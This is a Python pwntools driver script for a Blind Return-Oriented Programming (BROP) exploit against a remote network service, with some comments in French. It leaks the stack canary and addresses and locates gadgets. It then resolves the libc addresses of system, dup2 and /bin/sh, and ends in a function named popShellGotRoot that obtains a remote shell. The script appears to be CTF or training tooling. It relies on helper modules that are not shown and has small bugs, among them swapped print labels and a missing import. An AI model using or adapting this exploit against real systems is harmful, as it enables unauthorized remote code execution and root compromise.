#!/usr/bin/python3

from pwn import *
import sys, argparse
import binadr, libcadr, shell

# SYNTAX COLOURS AND SYSTEM DATA:

CRED = '\x1b[1;31;1m'
CVER = '\x1b[1;32;1m'
CJAU = '\x1b[1;33;1m'
CPUR = '\x1b[1;35;1m'
CEND = '\x1b[0m'

DODO = 0.03		# Cette valeur permet d'adapter les sleep si probleme de reception de paquet (a la campagne il doit etre grand x) )

#----------
class BinAdr():

	def __init__(self):
		super().__init__()
		self.STOPGADGET	= 0x0
		self.BROPGADGET	= 0x0
		self.LEAKADR	= 0x0
		self.BINBASE	= 0x0

class LibcAdr():

	def __init__(self):
		super().__init__()
		self.LIBCBASE	= 0x0
		self.DUP2		= 0x0
		self.SYSTEM		= 0x0
		self.BINSH		= 0x0
		self.BUILDID	= '14cd15d2eb0bc25c89045873cf807f7533e4788d'
		self.NOLIBLEAK	= False

	def _get_NOLIBLEAK(self):
		return(self._NOLIBLEAK)
	
	def _set_NOLIBLEAK(self, VALUE):
		if VALUE:
			print(CVER + "[+] No Libc leak will be perfomed" + CEND)
		self._NOLIBLEAK = VALUE
		return(self._NOLIBLEAK)
	
	NOLIBLEAK=property(_get_NOLIBLEAK, _set_NOLIBLEAK)


class LeakedValues():

	def __init__(self):
		super().__init__()

		##### A ADAPTER
		CANARY	= p64(0x633ff5b6fce38600)
		RBP		= p64(0x00007ffc44c70320)
		RETADR	= p64(0x00007f8332301245)
		###############


class ExploitStructure(BinAdr, LibcAdr, LeakedValues):

	HOST = TARGETED_HOST_NAME
	PORT = TARGETED_SERVICE_PORT

	def __init__(self):
		super().__init__()
		self.BUFFER = b'A'*40
		self.CRASH	= b'CRSHCRSH'

		self.EXPLOIT	= 1
		self.SIMPLELEAK	= False
		self.HAND		= False

	
	def remoteConnect(self):
		r = remote(self.HOST, self.PORT)
		return r
	
	def beginning(self):
		BEGIN = self.BUFFER + self.CANARY + self.RBP
		return BEGIN


#####

def persoPrint(STRING, ADR, NE):

	if NE == 1:
		print(CVER + "[+] " + STRING + " :	{}".format(hex(u64(ADR))) + CEND, end='')
	else:
		print(CVER + "[+] " + STRING + " :	{}".format(hex(u64(ADR))) + CEND)
	return

def persoInfo():
	CTHIN = '\x1b[1;32;0m'
	print(CVER + "\nInformations about --exploit option :" + CEND)
	print(CVER + "\t0 :" + CEND + CTHIN + " print this help and exit." + CEND)
	print(CVER + "\t1 :" + CEND + CTHIN + " perform a simple leak of the values of the targeted binary' stack." + CEND)
	print(CVER + "\t2 :" + CEND + CTHIN + " launch the attack from A to Z.\n" + CEND)
	exit()


def checkParameter(ExploitStructure):

	TMP = ExploitStructure

	parser		= argparse.ArgumentParser()
	conflict	= parser.add_mutually_exclusive_group()

	parser.add_argument("-d", "--debug",		help="show debugging informations during execution", action="store_true")	# me renseigner sur le store_true car j'ai oublie depuis le tmps ^^'
	parser.add_argument("-e", "--exploit",		help="launching standard exploitation ; pass 0 to get more informations", choices = [0, 1, 2], default = 2, type=int)
	parser.add_argument("-s", "--silent",		help="make pwntools silent", action="store_true")	# me renseigner sur le store_true car j'ai oublie depuis le tmps ^^'
	parser.add_argument("-v", "--handvalues",	help="use values set manually in the script", action="store_true")
	#parser.add_argument("-lv", "--leakvalues", help="simply leaking values and exit", action="store_true")

	conflict.add_argument("-b", "--buildid",		help="pass buildid for specific libc", type=str)
	conflict.add_argument("-n", "--nolibcleak",	help="don't perform libc leak ; be sure you already have a libc fragment from which read a BuildID", action="store_true")
	args = parser.parse_args()

	if args.silent:
		context.log_level='error'
	if args.debug:
		context.log_level='debug'

	if args.exploit == 0:
		persoInfo()
	else:
		TMP.EXPLOIT = args.exploit

	TMP.HAND		= args.handvalues
	
	TMP.NOLIBLEAK	= args.nolibcleak
	if args.buildid:
		TMP.BUILDID = args.buildid
		BUILDIDOK = checkBuildID(TMP.BUILDID)
		if (BUILDIDOK != 1):
			exit(CJAU + "[-] Leaving because of BuildID error" + CEND)

		TMP.NOLIBLEAK	= True
	
#mettre une infor conernant le non leak si buildid, ainsi qu'empêcher les deux options



#####

def stopGadget(ExploitStructure):
	TMP = ExploitStructure
	TMP.STOPGADGET	= binadr.getStopGadget(TMP)
	persoPrint('STOPGADGET ', TMP.STOPGADGET, 1)
	binadr.testGadget(TMP, 'STOPGADGET')

def bropGadget(ExploitStructure):
	TMP = ExploitStructure
	TMP.BROPGADGET	= binadr.getBropGadget(TMP)
	persoPrint('BROPGADGET ', TMP.BROPGADGET, 1)
	binadr.testGadget(TMP, 'BROPGADGET')

def leakAdr(ExploitStructure):		
	TMP = ExploitStructure
	TMP.LEAKADR, TMP.BINBASE = binadr.getLeakFunction(TMP)
	persoPrint('BINBASE    ', TMP.BINBASE, 0)
	persoPrint('LEAKADR    ', TMP.LEAKADR, 1)
	binadr.testGadget(TMP, 'LEAKADR')

def libcBase(ExploitStructure):
	TMP	= ExploitStructure
	TMP.LIBCBASE = libcadr.getLibcBase(TMP)
	persoPrint('LIBCBASE   ', TMP.LIBCBASE, 1)
	binadr.testGadget(TMP, 'LEAKADR')


def checkBuildID(BUILDID):
#	TMP = ExploitStructure

	if len(BUILDID) == 40:
		
		if (re.findall(r"([a-fA-F\d]{40})", BUILDID)):
			print(CVER + "[+] BuildID    :	" + BUILDID + CEND)
			return 1
		#else:
		#	print(CRED + "[!] Error with given BuildID    :	" + TMP.BUILDID + CEND)
	else:
		print(CRED + "[!] Error with given BuildID    :	" + BUILDID + CEND)
		'''
		vori si je demande quoi faire genre en remettre un, par exemple :
			ANOTHER = input(CJAU + "[?] Use specific BuildID ? (y / n) " + CEND)
			if ANOTHER == 'n':
				return 0
			elif ANOTHER == 'y':
			 	BUILDID = (input(CJAU + "[:] Put the other BuildID > " + CEND)).strip('\x0A')
			mais dans ce cas faut passer ee en parametre
			 	return 1
		'''
		return 0
		

def leakLib(ExploitStructure):
	TMP = ExploitStructure
	if (TMP.NOLIBLEAK):
		return
	libcadr.leakStuff(TMP)

def symboles(ExploitStructure):
	TMP = ExploitStructure
	TMP.SYSTEM, TMP.DUP2, TMP.BINSH = libcadr.getSymboles(TMP) 
	persoPrint('DUP2       ', TMP.SYSTEM, 0)
	persoPrint('SYSTEM     ', TMP.DUP2, 0)
	persoPrint('BINSH      ', TMP.BINSH, 0)

def popShellGotRoot(ExploitStructure):
	shell.exploit(ExploitStructure)


#####

def main():

	ee = ExploitStructure()
	checkParameter(ee)
	

#-----
	if ee.EXPLOIT == 1:
		print(CVER + "[+] Starting simple leak." + CEND)
		ee	= binadr.leakValues(ee)
		exit(CJAU + "[:] All 'Leakable' values are leaked" + CEND)

	elif ee.EXPLOIT == 2:
		print(CVER + "[+] Starting standard exploitation." + CEND)

		if ee.HAND:
			print(CJAU + "[:] Using manual values." + CEND)
			persoPrint('CANARY     ', ee.CANARY, 0)
			persoPrint('RBP        ', ee.RBP, 0)
			persoPrint('RETADR     ', ee.RETADR, 0)
		else:
			ee = binadr.leakValues(ee)

		stopGadget(ee)
		bropGadget(ee)
		leakAdr(ee)

		libcBase(ee)

		leakLib(ee)
		symboles(ee)

		popShellGotRoot(ee)

		exit(':D')
		


if __name__ == '__main__':
	main()



